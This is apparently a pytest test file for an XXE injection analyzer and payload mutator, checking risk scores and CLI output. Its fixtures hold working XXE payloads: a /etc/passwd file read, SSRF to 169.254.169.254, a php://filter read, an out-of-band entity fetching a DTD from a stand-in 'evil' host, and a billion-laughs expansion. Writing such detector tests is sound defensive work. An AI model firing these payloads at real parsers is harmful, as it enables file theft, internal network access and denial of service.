import json

from xyainjex import Context, analyze_xxe, mutate_xxe
from xyainjex.cli import main
from xyainjex.xxe.context import analyze_xxe_context

DOC = "{INPUT}"
DECL = '<?xml version="1.0"?>{INPUT}'
CONTENT = '<?xml version="1.0"?><root>{INPUT}</root>'

FILE = '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
SSRF = '<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><r>&xxe;</r>'
PHP = '<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/read=/etc/passwd">]><r>&xxe;</r>'
OOB = '<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://evil/x.dtd"> %ext;]><r/>'
LOL = (
    '<!DOCTYPE r [<!ENTITY a "aa"><!ENTITY b "&a;&a;&a;">'
    '<!ENTITY c "&b;&b;&b;">]><r>&c;</r>'
)


# --- context ---


def test_context_document():
    assert analyze_xxe_context(DOC) == Context.XXE_DOCUMENT
    assert analyze_xxe_context(DECL) == Context.XXE_DOCUMENT


def test_context_content():
    assert analyze_xxe_context(CONTENT) == Context.XXE_CONTENT


# --- document context ---


def test_benign_xml_is_low():
    r = analyze_xxe(DOC, "<root><a>hi</a></root>")
    assert not r.breakout.command_injected
    assert r.risk.value == "LOW"


def test_file_read_entity_is_high():
    r = analyze_xxe(DOC, FILE)
    assert r.breakout.command_injected
    assert "file-read" in r.breakout.separators
    assert r.risk.value == "HIGH"


def test_ssrf_entity_is_high():
    r = analyze_xxe(DOC, SSRF)
    assert "ssrf" in r.breakout.separators
    assert r.risk.value == "HIGH"


def test_php_wrapper_is_critical():
    r = analyze_xxe(DOC, PHP)
    assert "wrapper" in r.breakout.separators
    assert r.risk.value == "CRITICAL"


def test_parameter_entity_oob_is_critical():
    r = analyze_xxe(DOC, OOB)
    assert "parameter-entity" in r.breakout.separators
    assert "oob" in r.breakout.separators
    assert r.risk.value == "CRITICAL"


def test_billion_laughs_is_high():
    r = analyze_xxe(DOC, LOL)
    assert "expansion" in r.breakout.separators
    assert r.risk.value == "HIGH"


def test_external_dtd_subset_is_ssrf():
    r = analyze_xxe(DOC, '<!DOCTYPE r SYSTEM "http://evil/x.dtd"><r/>')
    assert "external-dtd" in r.breakout.separators
    assert r.risk.value == "HIGH"


def test_internal_only_entity_is_not_xxe():
    r = analyze_xxe(DOC, '<!DOCTYPE r [<!ENTITY x "harmless">]><r>&x;</r>')
    assert not r.breakout.command_injected
    assert r.risk.value == "MEDIUM"


# --- content context (mid-document) ---


def test_content_doctype_does_not_trigger():
    r = analyze_xxe(CONTENT, FILE)
    assert not r.breakout.command_injected
    assert r.risk.value == "MEDIUM"


def test_content_benign_is_low():
    r = analyze_xxe(CONTENT, "just text")
    assert not r.breakout.command_injected
    assert r.risk.value == "LOW"


# --- mutation ---


def test_mutate_document():
    result = mutate_xxe(DOC)
    assert result.context == Context.XXE_DOCUMENT
    assert result.valid > 0
    assert result.candidates[0].risk.value == "CRITICAL"


def test_mutate_content_needs_precondition():
    result = mutate_xxe(CONTENT)
    assert result.context == Context.XXE_CONTENT
    assert result.valid == 0


# --- result shape and CLI ---


def test_result_dialect_is_null():
    data = analyze_xxe(DOC, FILE).to_dict()
    assert data["dialect"] is None
    assert data["context"] == "xxe_document"


def test_cli_xxe_json(capsys):
    code = main(["--lang", "xxe", "--json", DOC, PHP])
    data = json.loads(capsys.readouterr().out)
    assert data["risk"] == "CRITICAL"
    assert data["dialect"] is None
    assert code == 2


def test_cli_xxe_mutate(capsys):
    code = main(["-l", "xxe", "--mutate", DOC])
    out = capsys.readouterr().out
    assert code == 0
    assert "High probability payloads" in out
